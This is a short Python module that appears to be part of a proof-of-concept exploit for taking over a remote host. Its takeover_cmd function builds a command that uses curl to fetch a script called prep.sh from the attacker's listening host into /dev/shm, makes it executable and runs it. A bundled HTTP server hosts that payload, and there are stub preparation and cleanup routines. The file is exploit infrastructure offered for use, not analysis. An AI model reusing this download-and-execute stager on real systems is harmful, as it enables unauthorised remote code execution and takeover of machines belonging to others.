#!/usr/bin/env python3
from http.server import HTTPServer, SimpleHTTPRequestHandler
import os
import threading
import time

def takeover_cmd(listen_ip: str, listen_port: int) -> str:
    cmd_str = f"curl http://{listen_ip}:{listen_port}/prep.sh -o /dev/shm/prep.sh ; chmod +x /dev/shm/prep.sh ; /dev/shm/prep.sh {listen_ip} {listen_port}"
    # return f"ping {listen_ip}"
    return cmd_str


from poc import logging

def http_server(listen_port):
    listen_ip = '0.0.0.0'
    srv_path = './srv'
    server = HTTPServer((listen_ip, listen_port), SimpleHTTPRequestHandler)
    thread = threading.Thread(target=server.serve_forever)
    thread.daemon = True

    cwd = os.getcwd()

    def start():
        os.chdir(srv_path)
        thread.start()
        logging(f"Starting server on port: {server.server_port}\n")

    def stop():
        os.chdir(cwd)
        server.shutdown()
        server.socket.close()
        logging(f"Stopping server on port: {server.server_port}\n")

    return start, stop

def takeover_prep(listen_ip: str, listen_port: int):
    logging("Takeover prep\n")


def takeover_cleanup():
    logging("Takeover cleanup")

